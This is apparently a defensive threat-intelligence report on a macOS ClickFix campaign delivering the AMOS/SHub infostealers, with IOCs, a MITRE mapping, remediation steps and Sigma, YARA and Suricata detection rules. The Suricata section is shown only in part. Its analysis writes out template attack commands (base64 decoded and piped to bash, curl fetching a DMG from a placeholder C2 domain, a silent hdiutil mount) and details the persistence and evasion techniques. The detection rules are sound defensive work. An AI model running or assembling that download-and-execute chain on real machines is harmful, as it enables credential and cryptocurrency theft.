# Technical Analysis Report: macOS ClickFix DMG Infostealer (2026-06-24)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-06-24
Version: 1.0 (DRAFT)

## Executive Summary

A new variant of the ClickFix social engineering campaign targeting macOS silently mounts malicious DMG disk images to deliver the Atomic macOS Stealer (AMOS) and SHub infostealer families. First reported by BleepingComputer on June 23, 2026, the technique instructs victims to paste a malicious command into Terminal that downloads a DMG file via `curl -fsSL`, silently mounts it using `hdiutil attach -nobrowse` (preventing display in Finder or on the desktop), searches up to three directory levels for `.app` or `.pkg` installers, and launches them with the macOS `open` command. The payload displays a fake System Preferences authentication dialog to harvest credentials, then exfiltrates browser data, cryptocurrency wallets, Keychain entries, SSH keys, and documents to attacker C2 infrastructure. The campaign has been tracked by Microsoft DEX since late 2025, with the DMG silent-mount variant representing the latest evolution. Russian-speaking operators are suspected based on CIS-region kill switches. Apple has introduced mitigations in macOS 26.4 targeting Terminal paste-based attacks, prompting threat actors to also develop Script Editor-based variants using the `applescript://` URL scheme.

## Background

ClickFix is a social engineering technique that uses fake CAPTCHA or verification pages to trick users into copying and executing malicious commands in their system terminal. Originally targeting Windows, the technique was adapted for macOS in late 2025. The campaign has evolved through multiple variants:

1. **Loader Campaign**: Base64-encoded, gzip-compressed shell scripts delivered via curl, using API key-gated C2 and dynamic AppleScript payloads executed in-memory via osascript
2. **Script Campaign**: Curl commands fetching shell scripts from attacker domains, with Telegram-based C2 fallback
3. **Helper Campaign**: DMG downloads with root-level persistence via LaunchDaemons
4. **DMG Silent Mount Campaign** (current): Silent DMG mounting via `hdiutil attach -nobrowse` to covertly deploy AMOS stealer

The threat actors abuse legitimate platforms including GitHub Pages, Medium, Squarespace, and Craft.me to host ClickFix instruction pages, and impersonate macOS system utilities, AI tools, and cryptocurrency platforms.

## Technical Analysis of the Malicious Payload

### 1. Initial Access: Fake CAPTCHA Social Engineering

The attack begins when a victim encounters a fake CAPTCHA or verification page hosted on attacker-controlled or compromised platforms. The page instructs the user to open Terminal and paste a command. The command typically uses base64 encoding to obfuscate the actual payload:

```
base64 -d <<< "<encoded_payload>" | bash
```

### 2. DMG Download and Silent Mount

The decoded payload executes a multi-step chain:

1. **Download**: `curl -fsSL https://<C2_DOMAIN>/path -o /tmp/<random>.dmg` downloads the DMG to a temporary location
2. **Silent Mount**: `hdiutil attach -nobrowse /tmp/<random>.dmg` mounts the disk image without displaying it in Finder or on the desktop (the `-nobrowse` flag prevents the volume from appearing in the sidebar or on the desktop)
3. **Payload Discovery**: The script searches up to three directory levels within the mounted volume for the first `.app` or `.pkg` file
4. **Execution**: The `open` command launches the discovered application bundle

The DMG observed in the BleepingComputer report is named `s.01M0td.dmg` and contains the application bundle `NNApp.app`.

### 3. Credential Harvesting via Fake Dialog

The AMOS payload uses `osascript` to render a fake System Preferences authentication prompt using AppleScript's `display dialog ... with hidden answer` construct, tricking users into entering their macOS login credentials.

### 4. Data Collection and Staging

The stealer harvests data into staging directories:

- **Staging path**: `/tmp/shub_<random_id>/`
- **File grabber**: `/tmp/shub_<random_id>/FileGrabber/` collects documents under 2MB matching targeted extensions
- **Archive**: `/tmp/shub_log.zip` or `/tmp/osalogging.zip`
- **Wallet payloads**: `/tmp/exodus_asar.zip`, `/tmp/atomic_asar.zip`, `/tmp/ledger_asar.zip`, `/tmp/trezor_asar.zip`

**Targeted data:**

| Category | Targets |
|----------|---------|
| Browsers | Chrome, Edge, Brave, Opera, Arc, Vivaldi, CocCoc, Yandex, Firefox, LibreWolf, SeaMonkey, Tor Browser, Waterfox, Zen |
| Crypto Wallets | Exodus, Electrum, Atomic, Wasabi, Bitcoin Core, Litecoin Core, DashCore, Guarda, Binance, Dogecoin, TonKeeper, Coinomi, Monero, Sparrow, Electron Cash |
| Wallet Apps (Trojanized) | Ledger Wallet, Ledger Live, Trezor Suite, Exodus (app.asar replacement) |
| System Data | macOS Keychain, iCloud, SSH keys (~/.ssh), AWS creds (~/.aws), Kubernetes config (~/.kube) |
| Messaging | Telegram Desktop, Discord |
| Documents | PDF, DOCX, DOC, TXT, RTF, CSV, XLS, XLSX, JSON, RDP, WALLET, KEY, KEYS, SEED, KDBX, PEM, OVPN |
| Config Files | ~/.zshrc, ~/.zsh_history, ~/.bash_history, ~/.gitconfig |
| Notes | Apple Notes (NoteStore.sqlite) |

### 5. Persistence Mechanisms

| Variant | Mechanism | Path |
|---------|-----------|------|
| Loader/SHub | LaunchAgent masquerading as Google Update | `~/Library/LaunchAgents/com.google.keystone.agent.plist` pointing to `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate` |
| Helper | Root-level LaunchDaemon | `/Library/LaunchDaemons/com.finder.helper.plist` |
| Script | Random LaunchAgent | `~/Library/LaunchAgents/com.<random>.plist` |
| Hidden binaries | Home directory | `~/.mainhelper`, `~/.agent` |

### 6. C2 Communication

- **Heartbeat beacon**: POST to `/api/bot/heartbeat` every 60 seconds with JSON payload containing `bot_id` (IOPlatformUUID), `build_id`, `hostname`, `ip`, `os_version`
- **Exfiltration**: POST to `/gate/chunk` with chunked ZIP archives (split at 85MB into 70MB chunks)
- **Loader delivery**: GET to `/loader.sh?build=<BUILD_ID>`
- **Remote command execution**: C2 responds with base64-encoded commands written to `/tmp/.c.sh`, executed, then deleted
- **Telemetry**: POST to `/api/debug/event` (including CIS-block events)
- **Helper exfiltration**: POST to `/contact` endpoint

### 7. Evasion Techniques

- **CIS region kill switch**: Checks `~/Library/Preferences/com.apple.HIToolbox.plist` for Russian input sources; exits if detected
- **Virtualization detection**: Checks for QEMU, VMware, KVM, "Virtual Machine", "Intel Core 2", "Chip: Unknown"
- **TLS bypass**: Uses `curl -k` flag to disable certificate validation
- **Quarantine bypass**: `xattr -cr` to strip quarantine attributes from modified wallet applications
- **Silent DMG mount**: `-nobrowse` flag prevents visual indicators in Finder
- **Base64 + gzip obfuscation**: Multi-stage encoded payloads
- **Script Editor variant**: Uses `applescript://` URL scheme to bypass macOS 26.4 Terminal paste protections

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs use defanged notation:
> - URLs: `hxxps://` replacing `https://`
> - Domains: `[.]` replacing dots
> - IP addresses: `[.]` replacing dots

### File Hashes (SHA-256)

| Hash | Description |
|------|-------------|
| `9191101893e419eac4be02d416e4eed405ba2055441f36e564f09c19cb26271c` | SHub Stealer v2.0 |
| `9d2da07aa6e7db3fbc36b36f0cfd74f78d5815f5ba55d0f0405cdd668bd13767` | ClickFix campaign payload |
| `7ca42f1f23dbdc9427c9f135815bb74708a7494ea78df1fbc0fc348ba2a161ae` | ClickFix campaign payload |
| `241a50befcf5c1aa6dab79664e2ba9cb373cc351cb9de9c3699fd2ecb2afab05` | ClickFix campaign payload |
| `522fdfaff44797b9180f36c654f77baf5cdeaab861bbf372ccfc1a5bd920d62e` | ClickFix campaign payload |

### Network Indicators

#### Primary C2 Domains

| Domain | Context |
|--------|---------|
| `svs-verificationdate[.]beer` | BleepingComputer-reported C2 |
| `imper-strlk5[.]com` | Datadog-reported C2 (SHub loader) |
| `securityfenceandwelding[.]com` | Datadog-reported C2 |
| `stobminipinporl[.]com` | Datadog-reported C2 |
| `mini-zmoto[.]com` | Datadog-reported C2 |
| `mubasokurso[.]com` | Datadog-reported C2 |
| `0x666[.]info` | Script campaign C2 |
| `honestly[.]ink` | Script campaign C2 |
| `pla7ina[.]cfd` | Script campaign C2 |
| `play67[.]cc` | Script campaign C2 |

#### ClickFix Distribution Domains

| Domain | Context |
|--------|---------|
| `cleanmymacos[.]org` | Microsoft-reported ClickFix lure |
| `mac-storage-guide[.]squarespace[.]com` | Squarespace-hosted ClickFix page |
| `claudecodedoc[.]squarespace[.]com` | AI tool impersonation |
| `domenpozh[.]net` | Encoded command distribution |
| `macos-disk-space[.]medium[.]com` | Medium-hosted fake troubleshooting |
| `macclean[.]craft[.]me` | Craft.me-hosted lure |
| `apple-mac-fix-hidden[.]medium[.]com` | Medium-hosted Apple impersonation |

#### IP Addresses

| IP | Context |
|----|---------|
| `196[.]251[.]107[.]171` | BleepingComputer-reported C2 |
| `95[.]85[.]251[.]177` | Script campaign infrastructure |
| `138[.]124[.]93[.]32` | Helper campaign exfiltration |
| `168[.]100[.]9[.]122` | Helper campaign exfiltration |
| `199[.]217[.]98[.]33` | Helper campaign exfiltration |
| `38[.]244[.]158[.]103` | Helper campaign exfiltration |
| `38[.]244[.]158[.]56` | Helper campaign exfiltration |
| `92[.]246[.]136[.]14` | Helper campaign exfiltration |
| `45[.]94[.]47[.]204` | Bot communication |

#### Script Campaign URLs

| URL | Context |
|-----|---------|
| `hxxps://cauterizespray[.]icu/script[.]sh` | Script payload delivery |
| `hxxps://enslaveculprit[.]digital/script[.]sh` | Script payload delivery |
| `hxxps://resilientlimb[.]icu/script[.]sh` | Script payload delivery |
| `hxxps://thickentributary[.]digital/script[.]sh` | Script payload delivery |
| `hxxps://round5on[.]digital/script[.]sh` | Script payload delivery |
| `hxxps://t[.]me/ax03bot` | Telegram C2 fallback |

### File System Indicators

| Path | Description |
|------|-------------|
| `/tmp/shub_<random>/` | SHub/AMOS data staging directory |
| `/tmp/shub_<random>/FileGrabber/` | Document collection subdirectory |
| `/tmp/shub_log.zip` | SHub exfiltration archive |
| `/tmp/osalogging.zip` | Alternative exfiltration archive |
| `/tmp/.c.sh` | Remote command execution script |
| `/tmp/helper` | Helper campaign staging |
| `/tmp/update` | Update variant staging |
| `/tmp/starter` | Plist staging |
| `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate` | Fake Google Update persistence binary |
| `~/Library/LaunchAgents/com.google.keystone.agent.plist` | Loader persistence plist |
| `/Library/LaunchDaemons/com.finder.helper.plist` | Helper root persistence plist |
| `~/.mainhelper` | Hidden backdoor binary |
| `~/.agent` | Execution wrapper script |
| `~/Library/Application Support/.com.apple.accountsd/` | Forensic indicator |

### Behavioral Indicators

- `hdiutil attach -nobrowse` invoked on a DMG downloaded to `/tmp/`
- `curl -fsSL` or `curl -kSsfL` fetching DMG files from unknown domains
- `base64 -d` piped to `bash`, `zsh`, or `sh`
- `osascript` spawning `display dialog` with `with hidden answer`
- Files created under `/tmp/shub_*`
- `dscl . -authonly` executed for credential validation
- `xattr -cr` targeting cryptocurrency wallet application directories
- LaunchAgent creation for `com.google.keystone.agent.plist` outside legitimate Chrome context
- HTTP POST to `/gate/chunk`, `/api/bot/heartbeat`, or `/contact` endpoints
- Modified `app.asar` files in Exodus, Atomic, Ledger, or Trezor application directories

### Malicious GitHub Accounts

| Account | Context |
|---------|---------|
| `bubblegum42poptart` | ClickFix GitHub Pages lures |
| `tvoymishka30kintus` | ClickFix GitHub Pages lures |
| `woodoo32stoke` | ClickFix GitHub Pages lures |
| `duckysisaryoku` | ClickFix GitHub Pages lures |
| `blackkillerbunch7` | ClickFix GitHub Pages lures |
| `duckymotby82` | ClickFix GitHub Pages lures |
| `fulos5` | ClickFix GitHub Pages lures |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1204.002 | User Execution: Malicious File | Victim pastes ClickFix command into Terminal; DMG file executed |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Shell scripts downloaded and executed via curl piped to bash/zsh |
| T1059.002 | Command and Scripting Interpreter: AppleScript | osascript used for fake dialogs and payload execution; Script Editor variant |
| T1105 | Ingress Tool Transfer | curl downloads DMG payload from C2 to /tmp |
| T1140 | Deobfuscate/Decode Files or Information | Base64 + gzip encoded payloads decoded at runtime |
| T1056.002 | Input Capture: GUI Input Capture | Fake System Preferences dialog harvests credentials |
| T1074.001 | Data Staged: Local Data Staging | Data staged in /tmp/shub_* before exfiltration |
| T1560.001 | Archive Collected Data: Archive via Utility | Data compressed into ZIP archives for exfiltration |
| T1041 | Exfiltration Over C2 Channel | ZIP archives uploaded via curl POST to C2 |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP used for C2 heartbeat and exfiltration |
| T1543.001 | Create or Modify System Process: Launch Agent | LaunchAgent plist created for persistence |
| T1543.004 | Create or Modify System Process: Launch Daemon | LaunchDaemon com.finder.helper.plist for root persistence |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Persistence binary masquerades as Google Software Update |
| T1555.001 | Credentials from Password Stores: Keychain | macOS Keychain credentials accessed |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Browser saved passwords, cookies, sessions stolen |
| T1005 | Data from Local System | Documents, SSH keys, cloud credentials harvested |
| T1554 | Compromise Host Software Binary | Cryptocurrency wallet app.asar files replaced with trojanized versions |
| T1553.001 | Subvert Trust Controls: Gatekeeper Bypass | xattr -cr used to strip quarantine attributes |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | VM detection (QEMU, VMware, KVM) and CIS region check |

## Detection & Remediation

### Immediate Detection Commands

```bash
# Check for silent DMG mount artifacts
mount | grep -i "nodev"
ls -la /tmp/*.dmg 2>/dev/null

# Check for SHub/AMOS staging directories
ls -la /tmp/shub_* 2>/dev/null
ls -la /tmp/.c.sh 2>/dev/null
ls -la /tmp/*_asar.zip 2>/dev/null
ls -la /tmp/osalogging.zip 2>/dev/null

# Check for persistence artifacts
ls -la ~/Library/Application\ Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate
ls -la ~/Library/LaunchAgents/com.google.keystone.agent.plist
ls -la /Library/LaunchDaemons/com.finder.helper.plist
ls -la ~/.mainhelper ~/.agent 2>/dev/null
ls -la ~/Library/Application\ Support/.com.apple.accountsd/ 2>/dev/null

# Check LaunchAgent content
plutil -p ~/Library/LaunchAgents/com.google.keystone.agent.plist 2>/dev/null

# Check for modified wallet applications
shasum -a 256 /Applications/Exodus.app/Contents/Resources/app.asar 2>/dev/null
shasum -a 256 /Applications/Ledger\ Live.app/Contents/Resources/app.asar 2>/dev/null
```

### Remediation

1. **Contain**: Block all listed C2 domains and IPs at network perimeter
2. **Remove persistence**: Delete malicious LaunchAgent/LaunchDaemon plists and associated binaries
3. **Clean staging**: Remove `/tmp/shub_*`, `/tmp/.c.sh`, `/tmp/*_asar.zip`
4. **Reinstall wallets**: Completely uninstall and reinstall cryptocurrency wallet applications -- app.asar files may be trojanized
5. **Rotate credentials**: Change all passwords stored in affected browsers and macOS Keychain; regenerate cryptocurrency wallet seed phrases if wallet hijacking is confirmed
6. **Revoke sessions**: Terminate active Telegram and Discord sessions
7. **Update macOS**: Ensure macOS 26.4+ is installed for Terminal paste-scanning protections

### Long-Term Hardening

- Disable `applescript://` URL scheme if not required
- Deploy endpoint detection monitoring for `hdiutil attach -nobrowse` invocations
- Monitor `/tmp/` for DMG file creation from curl processes
- Block known ClickFix GitHub Pages domains
- Implement DNS monitoring for high-entropy and unusual TLD domain queries
- Educate users about fake CAPTCHA social engineering

## Detection Rules

The following rules target specific artifacts and behaviors documented in the BleepingComputer, Microsoft, and Datadog analyses of the macOS ClickFix DMG infostealer campaign. Host-based rules cover the silent DMG mount technique, credential harvesting, persistence mechanisms, and staging artifacts. Network rules target known C2 infrastructure and communication patterns.

### Sigma Rule 1: Silent DMG Mount via hdiutil -nobrowse

Detects the core novel technique -- silent DMG mounting via `hdiutil attach -nobrowse` to prevent Finder/desktop display.

compile: sigma check N/A (network error fetching MITRE data) | splunk pass | log_scale pass | confidence: medium (TTP-level; hdiutil -nobrowse has legitimate uses in MDM/installer contexts)

```yaml
title: macOS ClickFix - Silent DMG Mount via hdiutil attach -nobrowse
id: a3f1c8e2-7d4b-4e9a-b5c6-8f2d3a1e7b94
status: experimental
description: >
    Detects execution of hdiutil with the -nobrowse flag to silently mount
    a DMG disk image without displaying it in Finder or on the desktop.
    This technique is used by the macOS ClickFix campaign to covertly mount
    malicious DMG files containing the Atomic macOS Stealer (AMOS).
references:
    - https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
    - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1204.002
    - attack.t1059.004
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        Image|endswith: '/hdiutil'
        CommandLine|contains|all:
            - 'attach'
            - '-nobrowse'
    condition: selection
falsepositives:
    - Legitimate software installers using silent DMG mounts
    - MDM or configuration management tools deploying packages
level: high
```

<!-- AUDIT: TTP-level detection for hdiutil -nobrowse silent mount. sigma check could not complete due to network error fetching MITRE ATT&CK STIX data (IncompleteRead). sigma convert --without-pipeline -t splunk: PASS (Image="*/hdiutil" CommandLine="*attach*" CommandLine="*-nobrowse*"). sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated via Python yaml.safe_load with all required fields present. Requires macOS EDR telemetry with process creation logging. -->

### Sigma Rule 2: Curl Download of DMG to Temp Directory

Detects curl with silent/follow flags downloading DMG files, characteristic of the ClickFix delivery mechanism.

compile: sigma check N/A (network error) | splunk pass | log_scale pass | confidence: medium (TTP-level; curl + DMG has legitimate uses)

```yaml
title: macOS ClickFix - Curl Download of DMG to Temp Directory
id: b7e2d9f4-3a5c-4b8e-c6d7-9e3f4a2b1c85
status: experimental
description: >
    Detects curl downloading a DMG file with silent flags commonly used in
    ClickFix campaigns. The attack chain uses curl with -fsSL or -kSsfL flags
    to fetch a DMG payload, which is then silently mounted via hdiutil.
references:
    - https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
    - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1204.002
    - attack.t1059.004
    - attack.t1105
logsource:
    category: process_creation
    product: macos
detection:
    selection_curl:
        Image|endswith: '/curl'
    selection_flags:
        CommandLine|contains:
            - '-fsSL'
            - '-kSsfL'
            - '-sSfL'
    selection_target:
        CommandLine|contains:
            - '.dmg'
            - '/tmp/'
    condition: selection_curl and selection_flags and selection_target
falsepositives:
    - Legitimate software auto-updaters downloading DMG files
    - Developer scripts fetching release builds
level: medium
```

<!-- AUDIT: TTP-level detection for curl DMG download pattern. sigma check N/A (MITRE network error). sigma convert --without-pipeline -t splunk: PASS (Image="*/curl" CommandLine IN ("*-fsSL*", "*-kSsfL*", "*-sSfL*") CommandLine IN ("*.dmg*", "*/tmp/*")). sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated. -->

### Sigma Rule 3: SHub/AMOS Stealer Staging Directory

Detects file creation in the `/tmp/shub_` staging directory, a high-fidelity indicator of SHub/AMOS infostealer activity.

compile: sigma check N/A (network error) | splunk pass | log_scale pass | confidence: high (specific staging path unique to this malware family)

```yaml
title: macOS ClickFix - SHub/AMOS Stealer Staging Directory Creation
id: c8f3e0a5-4b6d-5c9f-d7e8-0f4a5b3c2d96
status: experimental
description: >
    Detects creation of files in the /tmp/shub_ staging directory used by
    the SHub and AMOS infostealers delivered via macOS ClickFix campaigns.
    The malware stages stolen data in /tmp/shub_<random>/ directories
    before archiving and exfiltrating to C2.
references:
    - https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
    - https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1074.001
logsource:
    category: file_event
    product: macos
detection:
    selection:
        TargetFilename|contains: '/tmp/shub_'
    condition: selection
falsepositives:
    - Unlikely in production environments
level: high
```

<!-- AUDIT: IOC-level detection for specific staging path. sigma check N/A (MITRE network error). sigma convert --without-pipeline -t splunk: PASS (TargetFilename="*/tmp/shub_*"). sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated. High confidence -- /tmp/shub_ is unique to this malware family. -->

### Sigma Rule 4: Fake System Preferences Authentication Dialog via osascript

Detects osascript displaying credential-harvesting dialogs that impersonate System Preferences.

compile: sigma check N/A (network error) | splunk pass | log_scale pass | confidence: medium (TTP-level; osascript dialogs have legitimate uses)

```yaml
title: macOS ClickFix - osascript Displaying Fake Authentication Dialog
id: d9a4f1b6-5c7e-6d0a-e8f9-1a5b6c4d3e07
status: experimental
description: >
    Detects osascript being used to display dialog boxes that impersonate
    System Preferences or macOS authentication prompts. The ClickFix campaign
    uses this technique to trick users into entering credentials via fake
    system dialogs rendered by AppleScript.
references:
    - https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
    - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1056.002
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        Image|endswith: '/osascript'
        CommandLine|contains:
            - 'display dialog'
            - 'System Preferences'
            - 'with hidden answer'
    condition: selection
falsepositives:
    - Legitimate scripts using AppleScript dialogs
    - IT admin tools using osascript for user prompts
level: medium
```

<!-- AUDIT: TTP-level detection for T1056.002 GUI input capture. sigma check N/A (MITRE network error). sigma convert --without-pipeline -t splunk: PASS. sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated. Note: detection uses OR logic on CommandLine -- any one of the three strings triggers; consider tuning to require multiple for higher specificity. -->

### Sigma Rule 5: Malicious LaunchAgent/LaunchDaemon Persistence

Detects creation of specific persistence artifacts used by ClickFix campaign variants.

compile: sigma check N/A (network error) | splunk pass | log_scale pass | confidence: high (specific persistence path indicators)

```yaml
title: macOS ClickFix - Malicious LaunchAgent Persistence via com.finder.helper
id: e0b5a2c7-6d8f-7e1b-f9a0-2b6c7d5e4f18
status: experimental
description: >
    Detects creation of the com.finder.helper LaunchDaemon plist used by
    the Helper campaign variant of macOS ClickFix infostealers for root-level
    persistence, or creation of hidden agent/helper binaries in user home.
references:
    - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
    - https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1543.001
    - attack.t1543.004
logsource:
    category: file_event
    product: macos
detection:
    selection_helper_plist:
        TargetFilename|contains: 'com.finder.helper.plist'
    selection_hidden_agents:
        TargetFilename|endswith:
            - '/.mainhelper'
            - '/.agent'
    condition: selection_helper_plist or selection_hidden_agents
falsepositives:
    - Unlikely in production environments
level: high
```

<!-- AUDIT: IOC-level detection for specific persistence paths. sigma check N/A (MITRE network error). sigma convert --without-pipeline -t splunk: PASS. sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated. High confidence for com.finder.helper.plist; medium confidence for .mainhelper/.agent as generic filenames. -->

### Sigma Rule 6: Base64 Decoded Command Piped to Shell

Detects the initial ClickFix execution pattern of base64 decoding piped to a shell interpreter.

compile: sigma check N/A (network error) | splunk pass | log_scale pass | confidence: medium (TTP-level; base64 decode piped to shell used in many contexts)

```yaml
title: macOS ClickFix - Base64 Decoded Command Piped to Shell Execution
id: f1c6b3d8-7e9a-8f2c-a0b1-3c7d8e6f5a29
status: experimental
description: >
    Detects the initial ClickFix execution pattern where a base64-encoded
    payload is decoded and piped to bash/zsh for execution. This is the
    primary entry point for ClickFix campaigns where users paste the
    malicious command into Terminal.
references:
    - https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/
    - https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1059.004
    - attack.t1140
logsource:
    category: process_creation
    product: macos
detection:
    selection_base64_pipe:
        CommandLine|contains|all:
            - 'base64'
            - '-d'
        CommandLine|contains:
            - '| bash'
            - '| zsh'
            - '| sh'
    condition: selection_base64_pipe
falsepositives:
    - Developers decoding base64-encoded scripts
    - CI/CD pipelines using base64-encoded commands
level: medium
```

<!-- AUDIT: TTP-level detection for T1059.004 + T1140 base64 pipe to shell. sigma check N/A (MITRE network error). sigma convert --without-pipeline -t splunk: PASS (CommandLine="*base64*" CommandLine="*-d*" CommandLine IN ("*| bash*", "*| zsh*", "*| sh*")). sigma convert --without-pipeline -t log_scale: PASS. YAML structure validated. -->

### YARA Rules: ClickFix DMG AMOS Stealer

Three YARA rules targeting: (1) shell script artifacts with DMG mount + staging patterns, (2) malicious AppleScript dialog payloads, (3) known C2 domain strings.

compile: yarac ✅ pass | confidence: Rule 1 medium (behavioral strings), Rule 2 medium (AppleScript patterns), Rule 3 high (specific C2 domains)

```yara
rule ClickFix_DMG_AMOS_Stealer_Script
{
    meta:
        author = "Actioner"
        date = "2026-06-24"
        description = "Detects shell scripts associated with the macOS ClickFix campaign delivering AMOS/SHub infostealer. Matches the silent DMG mount technique and data staging patterns."
        reference = "https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/"
        hash = "9191101893e419eac4be02d416e4eed405ba2055441f36e564f09c19cb26271c"

    strings:
        $mount_silent = "hdiutil attach" ascii
        $nobrowse = "-nobrowse" ascii
        $staging_shub = "/tmp/shub_" ascii
        $staging_log = "shub_log.zip" ascii
        $exfil_gate = "/gate/chunk" ascii
        $heartbeat = "/api/bot/heartbeat" ascii
        $debug_event = "/api/debug/event" ascii
        $loader_sh = "/loader.sh?build=" ascii
        $curl_fssl = "curl -fsSL" ascii
        $wallet_exodus = "exodus_asar" ascii
        $wallet_ledger = "ledger_asar" ascii
        $wallet_trezor = "trezor_asar" ascii
        $wallet_atomic = "atomic_asar" ascii
        $bot_id_json = "bot_id" ascii
        $build_id_json = "build_id" ascii
        $filegrabber = "FileGrabber" ascii

    condition:
        (
            ($mount_silent and $nobrowse) or
            ($staging_shub or $staging_log) or
            ($exfil_gate and ($heartbeat or $debug_event)) or
            ($loader_sh and $curl_fssl) or
            (3 of ($wallet_exodus, $wallet_ledger, $wallet_trezor, $wallet_atomic)) or
            ($bot_id_json and $build_id_json and $filegrabber)
        )
        and filesize < 5MB
}

rule ClickFix_DMG_Malicious_AppleScript
{
    meta:
        author = "Actioner"
        date = "2026-06-24"
        description = "Detects malicious AppleScript payloads used in macOS ClickFix campaigns to display fake System Preferences dialogs and execute credential theft."
        reference = "https://www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/"

    strings:
        $applescript_dialog = "display dialog" ascii
        $hidden_answer = "with hidden answer" ascii
        $sys_prefs = "System Preferences" ascii
        $do_shell = "do shell script" ascii
        $curl_cmd = "curl" ascii
        $osascript = "osascript" ascii
        $base64_decode = "base64 -d" ascii
        $hdiutil = "hdiutil" ascii

    condition:
        (
            ($applescript_dialog and $hidden_answer and ($do_shell or $curl_cmd)) or
            ($osascript and $base64_decode and $hdiutil) or
            ($sys_prefs and $hidden_answer and $do_shell)
        )
        and filesize < 2MB
}

rule ClickFix_DMG_C2_Indicators
{
    meta:
        author = "Actioner"
        date = "2026-06-24"
        description = "Detects known C2 domain strings embedded in macOS ClickFix campaign payloads."
        reference = "https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/"

    strings:
        $c2_1 = "svs-verificationdate.beer" ascii nocase
        $c2_2 = "imper-strlk5.com" ascii nocase
        $c2_3 = "securityfenceandwelding.com" ascii nocase
        $c2_4 = "stobminipinporl.com" ascii nocase
        $c2_5 = "mini-zmoto.com" ascii nocase
        $c2_6 = "mubasokurso.com" ascii nocase
        $c2_7 = "cleanmymacos.org" ascii nocase
        $c2_8 = "0x666.info" ascii nocase
        $c2_9 = "honestly.ink" ascii nocase
        $c2_10 = "pla7ina.cfd" ascii nocase
        $c2_11 = "play67.cc" ascii nocase

    condition:
        any of ($c2_*)
        and filesize < 10MB
}
```

<!-- AUDIT: YARA rules compiled successfully via yarac (exit code 0, no errors, no warnings). Three rules covering behavioral patterns, AppleScript artifacts, and IOC-based C2 detection. Initial compilation failed due to unreferenced strings ($exfil_gate2, $sys_prefs, $c2_domain1, $cis_block) which were fixed by either removing unused strings or adding them to conditions. Final compilation: PASS. -->

### Suricata Rules: C2 Communication Detection

Ten Suricata rules targeting DNS lookups for known C2 domains and HTTP-based C2 communication patterns.

compile: suricata -T ✅ pass ("Configuration provided was successfully loaded. Exiting.") | confidence: DNS rules high (specific IOC domains), HTTP rules medium (URI patterns could match legitimate services)

```
alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - svs-verificationdate.beer DNS Lookup"; dns.query; content:"svs-verificationdate.beer"; nocase; sid:2200001; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.bleepingcomputer.com/news/security/new-macos-clickfix-attack-silently-mounts-dmgs-to-push-infostealer/; classtype:trojan-activity;)

alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - imper-strlk5.com DNS Lookup"; dns.query; content:"imper-strlk5.com"; nocase; sid:2200002; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/; classtype:trojan-activity;)

alert dns $HOME_NET any -> any any (msg:"ACTIONER ClickFix macOS C2 - cleanmymacos.org DNS Lookup"; dns.query; content:"cleanmymacos.org"; nocase; sid:2200003; rev:1; metadata: author Actioner, created_at 2026_06_24, deployment Perimeter; reference:url,www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/; classtype:trojan-activity;)

